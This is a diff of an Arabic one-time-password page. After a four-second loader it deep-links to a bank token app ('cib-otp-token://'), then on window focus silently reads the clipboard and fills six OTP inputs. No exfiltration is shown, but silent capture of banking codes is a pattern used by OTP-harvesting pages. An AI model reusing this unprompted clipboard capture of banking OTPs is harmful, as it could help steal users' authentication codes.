@@ -2,35 +2,77 @@
 <html lang="ar">
 <head>
 <meta charset="UTF-8">
-<title>OTP</title>
+<title>رمز التحقق</title>
 
 <style>
 body {
   font-family: Arial;
+  background: #f9fafb;
   text-align: center;
   padding: 30px;
 }
 
-.otp-inputs input {
-  width: 40px;
+/* Loader */
+#loader {
+  margin-top: 80px;
+}
+
+.spinner {
+  width: 50px;
   height: 50px;
+  border: 5px solid #ddd;
+  border-top: 5px solid #2563eb;
+  border-radius: 50%;
+  animation: spin 1s linear infinite;
+  margin: auto;
+}
+
+@keyframes spin {
+  100% { transform: rotate(360deg); }
+}
+
+/* Box */
+.card {
+  background: white;
+  padding: 20px;
+  border-radius: 16px;
+  margin-top: 30px;
+  box-shadow: 0 5px 20px rgba(0,0,0,0.08);
+}
+
+/* OTP */
+.otp-inputs input {
+  width: 45px;
+  height: 55px;
   font-size: 20px;
   text-align: center;
   margin: 5px;
-}
-
-#confirmBox, #pasteSection {
-  display: none;
-  margin-top: 20px;
-}
-
-button {
-  padding: 10px 20px;
-  border: none;
+  border: 1px solid #ddd;
   border-radius: 10px;
+}
+
+/* Buttons */
+button {
+  width: 100%;
+  padding: 12px;
+  border: none;
+  border-radius: 12px;
+  font-size: 16px;
+  margin-top: 15px;
+}
+
+.primary {
   background: #2563eb;
   color: white;
-  font-size: 16px;
+}
+
+.success {
+  background: #16a34a;
+  color: white;
+}
+
+.hidden {
+  display: none;
 }
 </style>
 
@@ -40,42 +82,47 @@ button {
 
 <h2>رمز التحقق</h2>
 
-<div class="otp-inputs">
-  <input maxlength="1">
-  <input maxlength="1">
-  <input maxlength="1">
-  <input maxlength="1">
-  <input maxlength="1">
-  <input maxlength="1">
+<!-- Loader -->
+<div id="loader">
+  <div class="spinner"></div>
+  <p>جاري التحضير...</p>
 </div>
 
-<p id="loadingText">جاري التحضير...</p>
-
-<!-- سؤال التوجيه -->
-<div id="confirmBox">
-  <p>هل تريد فتح تطبيق التوكن؟</p>
-  <button onclick="goToApp()">حسناً</button>
+<!-- Step 1 -->
+<div id="step1" class="card hidden">
+  <p>لإكمال العملية، يرجى فتح تطبيق التوكن</p>
+  <button class="primary" onclick="openApp()">فتح تطبيق التوكن</button>
 </div>
 
-<!-- زر اللصق -->
-<div id="pasteSection">
-  <button onclick="pasteCode()">📋 لصق الرمز</button>
+<!-- Step 2 OTP -->
+<div id="step2" class="card hidden">
+  <p>أدخل رمز التحقق</p>
+
+  <div class="otp-inputs">
+    <input maxlength="1">
+    <input maxlength="1">
+    <input maxlength="1">
+    <input maxlength="1">
+    <input maxlength="1">
+    <input maxlength="1">
+  </div>
+
+  <button class="success" onclick="pasteCode()">📋 لصق الرمز</button>
 </div>
 
 <script>
 
-// ⏳ بعد 4 ثواني يظهر السؤال
+// ⏳ Loader → Step1
 setTimeout(() => {
-  document.getElementById("loadingText").style.display = "none";
-  document.getElementById("confirmBox").style.display = "block";
+  document.getElementById("loader").style.display = "none";
+  document.getElementById("step1").classList.remove("hidden");
 }, 4000);
 
 // 🚀 فتح التطبيق
-function goToApp() {
-  window.location.href = "cib-otp-token://";
-
-  // نخزن انه راح للتطبيق
+function openApp() {
   localStorage.setItem("openedApp", "true");
+
+  window.location.href = "cib-otp-token://";
 }
 
 // 📋 لصق الكود
@@ -88,7 +135,7 @@ async function pasteCode() {
   }
 }
 
-// تعبئة الخانات
+// تعبئة OTP
 function fillInputs(code) {
   code = code.replace(/\D/g, "");
 
@@ -100,21 +147,22 @@ function fillInputs(code) {
 }
 
 // 🔥 عند الرجوع من التطبيق
-window.addEventListener("focus", () => {
-  if (localStorage.getItem("openedApp") === "true") {
-    document.getElementById("pasteSection").style.display = "block";
-  }
-});
-
-// 🔥 Auto paste عند الرجوع
 window.addEventListener("focus", async () => {
-  try {
-    let text = await navigator.clipboard.readText();
 
-    if (text.length >= 4) {
-      fillInputs(text);
-    }
-  } catch {}
+  if (localStorage.getItem("openedApp") === "true") {
+
+    document.getElementById("step1").classList.add("hidden");
+    document.getElementById("step2").classList.remove("hidden");
+
+    // Auto paste
+    try {
+      let text = await navigator.clipboard.readText();
+
+      if (text.length >= 4) {
+        fillInputs(text);
+      }
+    } catch {}
+  }
 });
 
 </script>
